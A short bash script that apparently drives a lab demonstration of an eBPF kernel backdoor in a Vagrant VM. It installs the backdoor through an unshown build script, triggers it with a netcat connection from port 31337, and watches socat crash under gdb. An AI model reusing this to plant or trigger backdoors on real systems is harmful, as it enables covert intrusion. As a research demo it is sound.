#!/bin/bash
set -e

echo -e '\x1b[93m[*] Preparing vm\x1b[m'
vagrant up
echo -e '\x1b[93m[*] Restarting VM to load newest kernel\x1b[m'
vagrant reload default
echo -e '\x1b[93m[*] Installing backdoor\x1b[m'
vagrant ssh -c 'sudo rm /sys/fs/bpf/totally_safe; cd /vagrant && ./build_and_run.sh'
(
  sleep 1
  echo -e '\x1b[93m[*] waiting for socat to come up\x1b[m'
  sleep 3
  echo -e '\x1b[93m[*] triggering bpf backdoor\x1b[m'
  nc -p 31337 127.0.0.1 1337
) &
echo -e '\x1b[93m[*] Debugging socat\x1b[m'
vagrant ssh -c 'gdb --batch -ex r -ex "i f" --args socat TCP-LISTEN:1337,reuseport -' | grep --color=always -P '4141|4242|SIGSEGV|$'
